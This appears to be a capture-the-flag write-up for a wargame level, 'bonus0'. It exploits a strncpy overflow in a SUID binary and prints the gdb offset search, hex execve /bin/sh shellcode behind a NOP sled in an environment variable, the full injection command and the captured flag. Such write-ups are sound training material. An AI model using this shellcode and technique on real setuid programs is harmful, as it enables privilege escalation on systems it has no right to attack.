# Bonus 0

SUID **bonus1**. NX off (`GNU_STACK` is `RWE`), so injected shellcode runs. Bug: `strncpy(dest, buffer, 20)` with no terminator lets two 20-byte inputs run together and overflow `main`'s `buf`.

1. Find the offset (cyclic pattern as input 2, two separate writes since `p()` calls `read()` twice):
   ```
   (python -c 'print "0"*20'; sleep 0.3; python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab"'; sleep 0.3) | gdb -q -batch -ex run -ex 'p/x $eip' ./bonus0
   0x41336141 in ?? ()
   ```
   `"Aa3A"` → offset **9**.

2. The shellcode lives in an exported `SHELLCODE` environment variable behind a 64KB NOP sled (no size limit, unlike `p()`'s 4096-byte `buffer`, so there's tens of thousands of bytes of margin for address drift instead of ~100), and needs its address, measured right before running. Doing this by hand means gdb, then a separate run, in the same terminal, back to back; `Ressources/exploit.py` does both automatically:
   ```
   cd ~ && python /tmp/exploit.py    # copy it to /tmp first, home is usually read-only
   SHELLCODE at 0xbffefe6e, aiming at 0xbfff7e6e
   uid=2010(bonus0) [...] euid=2011(bonus1) [...]
   cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
   ```
   Run it again if it prints no output or a garbled line instead of a euid switch, that means the address it measured didn't survive to the actual run, rare but possible.

By hand, step 2 is:
```
export SHELLCODE=$(python -c 'print "\x90"*65536 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
gdb -q -batch -ex "b *main" -ex run -ex 'p (char *)getenv("SHELLCODE")' ./bonus0
$1 = 0xbffefe72 "\220\220\220..."
```
Aim well inside the sled, not at its edge: address `+ 0x8000`, little-endian. Then, in the same terminal, immediately:
```
(python -c 'print "A"*20'; sleep 0.3; python -c 'print "A"*9 + "<target bytes>" + "B"*7'; sleep 0.3; cat) | ./bonus0
```

Flag: `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
